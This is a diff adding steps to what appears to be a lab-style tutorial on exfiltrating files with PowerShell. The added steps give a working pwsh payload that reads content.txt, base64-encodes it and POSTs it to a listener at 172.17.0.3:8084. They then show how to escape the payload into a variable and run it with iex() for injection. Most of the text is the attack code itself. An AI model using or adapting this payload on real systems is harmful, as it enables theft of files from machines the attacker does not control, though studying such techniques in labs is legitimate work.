@@ -24,3 +24,29 @@ Invoke-WebRequest -Uri $uri -Method POST
 echo "MQAyADMAMQAyADMA" | base64 -d
 123123 <<< You've exfiltrated a file!
 ```
+
+
+7. Convert the payload to something that can be injected:
+
+```
+pwsh -c '$uri = \"http://172.17.0.3:8084/\"
+$FileName=\"content.txt\"
+$Data = get-content $FileName
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
+$EncodedData = [Convert]::ToBase64String($Bytes)
+$uri = $uri + \"?data=\"+$EncodedData
+Invoke-WebRequest -Uri $uri -Method POST'
+```
+
+All the above needs to be ran by the shell. Move the payload to a variable (with proper escaping) and then invoke iex() to execute it:
+
+```
+pwsh -c '$A=\'$uri = \"http://172.17.0.3:8084/\"
+$FileName=\"content.txt\"
+$Data = get-content $FileName
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
+$EncodedData = [Convert]::ToBase64String($Bytes)
+$uri = $uri + \"?data=\"+$EncodedData
+Invoke-WebRequest -Uri $uri -Method POST
+iex($A)'\'
+```
